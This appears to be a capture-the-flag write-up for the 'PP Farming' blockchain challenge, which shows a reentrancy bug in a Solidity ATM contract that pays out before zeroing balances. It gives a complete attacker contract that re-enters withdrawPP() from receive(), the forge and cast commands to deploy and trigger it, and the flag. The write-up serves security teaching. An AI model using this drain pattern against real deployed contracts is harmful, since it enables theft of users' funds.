---
title: "PP Farming"
ctf: "SekaiCTF 2026"
date: 2026-07-01
category: blockchain
difficulty: easy
points: 0
flag_format: "SEKAI{...}"
author: "sid"
---

# PP Farming

## Summary

`PerformancePointATM` credits a `scores[address]` mapping on donation, then lets
you withdraw it back. `withdrawPP()` sends the ETH out via a raw `.call` *before*
zeroing the caller's score — a textbook checks-effects-interactions violation.
An attacker contract re-enters `withdrawPP()` from its `receive()` hook and
drains the ATM in a loop.

## Solution

### Step 1: Spot the reentrancy

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    (bool result, ) = msg.sender.call{value: score}("");   // <-- external call first
    require(result, "Transfer failed");
    scores[msg.sender] = 0;                                 // <-- effect happens after
}
```

`scores[msg.sender]` is only zeroed *after* the external call returns. If
`msg.sender` is a contract with a `receive()` hook, that hook runs mid-call
while `scores[msg.sender]` is still non-zero, so it can call `withdrawPP()`
again and again until the ATM's balance is empty. `isSolved()` just checks
`address(this).balance == 0`.

### Step 2: Attacker contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
}

contract Exploit {
    IPerformancePointATM public target;
    uint256 public count;

    constructor(address _target) {
        target = IPerformancePointATM(_target);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether seed");
        count = 0;
        target.donatePP{value: msg.value}(address(this));
        target.withdrawPP();
    }

    receive() external payable {
        if (address(target).balance > 0 && count < 20) {
            count++;
            target.withdrawPP();
        }
    }

    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }
}
```

Donate 1 ether to seed a positive score, call `withdrawPP()`, and let
`receive()` recursively call `withdrawPP()` again on every incoming transfer
until the ATM (funded with 10 ether) is fully drained.

### Step 3: Deploy and trigger

```bash
forge create --rpc-url $RPC_URL --private-key $PK \
    src/Exploit.sol:Exploit --constructor-args $ATM_ADDR

cast send $EXPLOIT 'attack()' --value 1ether --rpc-url $RPC_URL --private-key $PK
cast send $EXPLOIT 'drain(address)' $PLAYER --rpc-url $RPC_URL --private-key $PK
cast call $ATM_ADDR 'isSolved()' --rpc-url $RPC_URL
```

`isSolved()` returns `true` once the ATM balance hits zero.

## Flag

```
SEKAI{3Z_re3ntr4ncy_atTack5}
```
